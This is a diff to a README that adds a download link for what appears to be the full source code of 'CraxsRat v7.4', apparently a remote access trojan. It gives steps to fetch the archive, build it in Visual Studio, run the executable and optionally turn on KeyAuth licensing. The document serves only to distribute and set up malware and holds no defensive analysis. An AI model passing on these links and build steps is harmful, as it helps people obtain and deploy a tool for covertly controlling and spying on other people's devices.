@@ -6,11 +6,11 @@ The code is very easy to compile and use.
 
 ## How to Compile
 
-- Download the project to your computer.
-- Extract the ZIP file from the archive.  
-- Open the solution file.  
-- To compile the project, select **Build Solution** from the **Build** menu. (Location of compiled files: `./bin/Debug/`)  
-- After the compilation is complete, run the `CraxsRat v7.4.exe` file.  
+- [Download the project to your computer. (Click Here)](https://github.com/CRAX-00/CraxsRAT-7.4-FULL-Source-Code/releases/download/CraxsRAT-Source/CraxsRat-SRC-7.4.7z)
+- Extract the ZIP file from the archive.
+- Open the solution file.
+- To compile the project, select **Build Solution** from the **Build** menu. (Location of compiled files: `./bin/Debug/`)
+- After the compilation is complete, run the `CraxsRat v7.4.exe` file.
 - Click the **Login** button to log in and start using the software.
 
 **Note:** The KeyAuth system is disabled by default. You can enable it optionally. (See `./CraxsRat/Ports.cs: 1192-1203`)
